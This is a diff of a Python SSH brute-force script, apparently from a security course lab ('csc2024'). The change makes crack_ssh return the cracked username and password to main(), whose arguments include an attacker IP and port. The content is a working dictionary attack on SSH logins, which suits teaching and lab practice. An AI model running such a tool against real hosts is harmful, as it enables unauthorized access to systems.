@@ -60,7 +60,7 @@ def connect_ssh(hostname: str = "victim", username: str = "csc2024", password: s
         print(f"{prefix}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
     return 0
 
-def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") -> int:
+def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") -> (int, str, str):
     # read combinations from file
     # crack ssh using the string in the file
     username = "csc2024"
@@ -69,8 +69,8 @@ def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") 
         for line in fd:
             ret = connect_ssh(hostname=target_hostname, username=username, password=line.strip())
             if ret == 0:
-                break
-    return 0
+                return (0, username, line.strip())
+    return (1, "", "")
 
 def parse_arguments() -> tuple:
     if len(sys.argv) < 3:
@@ -86,7 +86,11 @@ def parse_arguments() -> tuple:
 def main():
     victim_ip, attack_ip, attacker_port = parse_arguments()
     generate_combinations()
-    crack_ssh(target_hostname=victim_ip)
+    ret_val, username, password = crack_ssh(target_hostname=victim_ip)
+    if ret_val == 1:
+        print("[*] No valid credential found in the dictionary")
+        return 0
+
 
 if __name__ == "__main__":
     main()
